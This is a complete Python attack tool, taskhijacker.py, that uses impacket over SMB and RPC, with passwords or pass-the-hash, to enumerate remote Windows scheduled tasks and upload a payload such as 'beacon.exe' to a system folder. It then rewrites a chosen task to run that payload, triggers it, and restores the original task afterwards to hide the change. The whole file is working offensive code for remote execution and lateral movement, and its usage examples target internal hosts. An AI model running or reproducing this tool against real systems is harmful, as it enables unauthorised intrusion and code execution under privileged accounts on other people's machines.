#!/usr/bin/env python3
"""taskhijacker.py — Enumerate and hijack writable scheduled tasks via impacket RPC/SMB"""

import argparse
import os
import signal
import sys
import time
import xml.etree.ElementTree as ET

from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SMBConnection

TASK_NS = 'http://schemas.microsoft.com/windows/2004/02/mit/task'
NS = f'{{{TASK_NS}}}'

_restore_ctx = {}


def parse_args():
    p = argparse.ArgumentParser(
        description='Enumerate and hijack scheduled tasks via RPC/SMB',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
Examples:
  %(prog)s 192.168.1.10 -u admin -p 'P@ss' -d corp beacon.exe
  %(prog)s 192.168.1.10 -u admin -H :aad3b435b51404eeaad3b435b51404ee beacon.exe
  %(prog)s 192.168.1.10 -u admin -p pass beacon.exe --upload-path 'C:\\Windows\\System32\\spool\\drivers\\color' --wait 10
''')
    p.add_argument('target')
    p.add_argument('-u', '--username', default='')
    p.add_argument('-p', '--password', default='')
    p.add_argument('-d', '--domain', default='WORKGROUP')
    p.add_argument('-H', '--hashes', default='', metavar='LM:NT',
                   help='Pass-the-hash (:NT or LM:NT)')
    p.add_argument('payload', help='Local payload path')
    p.add_argument('--upload-path', default='C:\\Windows\\Temp',
                   help='Remote dir to drop payload (default: C:\\Windows\\Temp)')
    p.add_argument('--remote-name', default='',
                   help='Filename on target (default: same as local)')
    p.add_argument('--wait', type=int, default=5,
                   help='Seconds between trigger and restore (default: 5)')
    p.add_argument('--no-restore', action='store_true',
                   help='Skip restoring original task')
    return p.parse_args()


def split_hashes(h):
    if not h:
        return '', ''
    parts = h.split(':')
    return (parts[0], parts[1]) if len(parts) == 2 else ('', parts[0])


def rpc_connect(target, user, passwd, domain, lm, nt):
    sb = f'ncacn_np:{target}[\\pipe\\atsvc]'
    t = transport.DCERPCTransportFactory(sb)
    t.set_dport(445)
    t.setRemoteHost(target)
    t.set_credentials(user, passwd, domain, lm, nt)
    dce = t.get_dce_rpc()
    dce.connect()
    dce.bind(tsch.MSRPC_UUID_TSCHS)
    return dce


def smb_connect(target, user, passwd, domain, lm, nt):
    c = SMBConnection(target, target)
    c.login(user, passwd, domain, lm, nt)
    return c


def iter_names(resp):
    """Yield string names from a SchRpcEnum* response, handling NDR array variants."""
    names = resp['pNames']
    try:
        # PTASK_NAMES_ARRAY pointer -> Data array
        for n in names['Data']:
            yield str(n).strip('\x00')
        return
    except (TypeError, KeyError):
        pass
    try:
        count = resp['pCount']
        for i in range(count):
            yield str(names[i]).strip('\x00')
        return
    except Exception:
        pass
    # fallback: direct iteration
    for n in names:
        yield str(n).strip('\x00')


def enum_tasks(dce, folder='\\'):
    tasks = []
    try:
        for name in iter_names(tsch.hSchRpcEnumTasks(dce, folder)):
            if not name:
                continue
            path = folder.rstrip('\\') + '\\' + name
            try:
                tasks.append((path, tsch.hSchRpcRetrieveTask(dce, path)['pXml']))
            except Exception:
                pass
    except Exception:
        pass
    try:
        for name in iter_names(tsch.hSchRpcEnumFolders(dce, folder)):
            if not name:
                continue
            tasks.extend(enum_tasks(dce, folder.rstrip('\\') + '\\' + name))
    except Exception:
        pass
    return tasks


def parse_xml(xml_str):
    info = {'command': None, 'arguments': None, 'triggers': [], 'run_as': '?'}
    try:
        root = ET.fromstring(xml_str.lstrip('﻿'))
        for el in root.iter(f'{NS}Exec'):
            c = el.find(f'{NS}Command')
            a = el.find(f'{NS}Arguments')
            info['command'] = c.text if c is not None else None
            info['arguments'] = a.text if a is not None else None
            break
        trigs = root.find(f'.//{NS}Triggers')
        if trigs is not None:
            for child in trigs:
                tag = child.tag.replace(NS, '').replace('Trigger', '') or 'Unknown'
                info['triggers'].append(tag)
        pr = root.find(f'.//{NS}Principal')
        if pr is not None:
            uid = pr.find(f'{NS}UserId') or pr.find(f'{NS}GroupId')
            lvl = pr.find(f'{NS}RunLevel')
            name = uid.text if uid is not None else '?'
            elevated = lvl is not None and lvl.text == 'HighestAvailable'
            info['run_as'] = name + (' (hi)' if elevated else '')
    except ET.ParseError:
        pass
    return info


def last_run(dce, path):
    try:
        t = tsch.hSchRpcGetLastRunInfo(dce, path)['pLastRunTime']
        if t['wYear'] == 0:
            return 'Never'
        return f"{t['wYear']}-{t['wMonth']:02d}-{t['wDay']:02d} {t['wHour']:02d}:{t['wMinute']:02d}"
    except Exception:
        return '?'


def patch_xml(xml_str, new_cmd):
    bom = '﻿' if xml_str.startswith('﻿') else ''
    ET.register_namespace('', TASK_NS)
    root = ET.fromstring(xml_str.lstrip('﻿'))
    for el in root.iter(f'{NS}Exec'):
        c = el.find(f'{NS}Command')
        a = el.find(f'{NS}Arguments')
        if c is None:
            return None
        c.text = new_cmd
        if a is not None:
            el.remove(a)
        break
    else:
        return None
    return bom + ET.tostring(root, encoding='unicode', xml_declaration=False)


def upload(smb, local_path, remote_dir, remote_name):
    drive = remote_dir[0].upper()
    rel = remote_dir[3:].strip('\\') + '\\' + remote_name
    print(f'[*] Uploading -> \\\\{smb.getRemoteHost()}\\{drive}$\\{rel}')
    with open(local_path, 'rb') as f:
        smb.putFile(drive + '$', rel, f.read)
    return remote_dir.rstrip('\\') + '\\' + remote_name


def do_restore(dce, path, xml):
    tsch.hSchRpcRegisterTask(dce, path, xml, tsch.TASK_UPDATE, NULL, tsch.TASK_LOGON_NONE)


def _sigint(sig, frame):
    print('\n[!] Interrupted — restoring task...')
    if _restore_ctx.get('active'):
        try:
            do_restore(_restore_ctx['dce'], _restore_ctx['path'], _restore_ctx['xml'])
            print('[+] Restored.')
        except Exception as e:
            print(f'[-] Restore failed: {e}')
            print(f'[!] Manual restore: {_restore_ctx["path"]}')
    sys.exit(1)


def main():
    args = parse_args()
    lm, nt = split_hashes(args.hashes)
    remote_name = args.remote_name or os.path.basename(args.payload)

    print(f'[*] Target: {args.target}')

    try:
        dce = rpc_connect(args.target, args.username, args.password, args.domain, lm, nt)
        print('[+] RPC OK')
    except Exception as e:
        sys.exit(f'[-] RPC failed: {e}')

    try:
        smb = smb_connect(args.target, args.username, args.password, args.domain, lm, nt)
        print('[+] SMB OK')
    except Exception as e:
        sys.exit(f'[-] SMB failed: {e}')

    print('[*] Enumerating tasks...')
    all_tasks = enum_tasks(dce)
    print(f'[*] {len(all_tasks)} tasks found')

    candidates = []
    for path, xml in all_tasks:
        info = parse_xml(xml)
        if info['command']:
            candidates.append({
                'path': path,
                'xml': xml,
                'info': info,
                'last_run': last_run(dce, path),
            })

    if not candidates:
        sys.exit('[-] No Exec-type tasks found.')

    W = {'#': 3, 'Task': 52, 'Command': 40, 'Triggers': 16, 'Last Run': 17, 'Run As': 25}
    header = '  '.join(k.ljust(v) for k, v in W.items())
    print(f'\n{header}')
    print('-' * len(header))

    for i, t in enumerate(candidates):
        info = t['info']
        row = {
            '#': str(i),
            'Task': t['path'][-(W['Task']):],
            'Command': (info['command'] or '')[:W['Command'] - 1],
            'Triggers': ','.join(info['triggers'])[:W['Triggers'] - 1] or '-',
            'Last Run': t['last_run'],
            'Run As': (info['run_as'])[:W['Run As'] - 1],
        }
        print('  '.join(row[k].ljust(W[k]) for k in W))

    print()
    try:
        idx = int(input('Select task [#]: ').strip())
        assert 0 <= idx < len(candidates)
    except (ValueError, AssertionError, KeyboardInterrupt):
        sys.exit('\n[-] Aborted.')

    target = candidates[idx]
    print(f'\n[*] Hijacking:  {target["path"]}')
    print(f'    Original:   {target["info"]["command"]}')

    try:
        remote_path = upload(smb, args.payload, args.upload_path, remote_name)
        print(f'[+] Payload:    {remote_path}')
    except Exception as e:
        sys.exit(f'[-] Upload failed: {e}')

    patched = patch_xml(target['xml'], remote_path)
    if patched is None:
        sys.exit('[-] Failed to patch task XML.')

    signal.signal(signal.SIGINT, _sigint)
    _restore_ctx.update({'dce': dce, 'path': target['path'], 'xml': target['xml'], 'active': False})

    print('[*] Overwriting task...')
    try:
        tsch.hSchRpcRegisterTask(
            dce, target['path'], patched, tsch.TASK_UPDATE, NULL, tsch.TASK_LOGON_NONE
        )
        _restore_ctx['active'] = True
        print('[+] Task overwritten.')
    except Exception as e:
        sys.exit(f'[-] Overwrite failed: {e}')

    print('[*] Triggering task...')
    try:
        tsch.hSchRpcRun(dce, target['path'])
        print('[+] Triggered.')
    except Exception as e:
        print(f'[-] Trigger failed: {e}')

    if not args.no_restore:
        print(f'[*] Waiting {args.wait}s...')
        time.sleep(args.wait)
        print('[*] Restoring...')
        try:
            do_restore(dce, target['path'], target['xml'])
            _restore_ctx['active'] = False
            print('[+] Restored.')
        except Exception as e:
            print(f'[-] Restore failed: {e}')
            print(f'[!] Manual restore needed: {target["path"]}')
    else:
        print(f'[!] --no-restore: task left modified ({remote_path})')

    dce.disconnect()
    smb.close()
    print('[*] Done.')


if __name__ == '__main__':
    main()
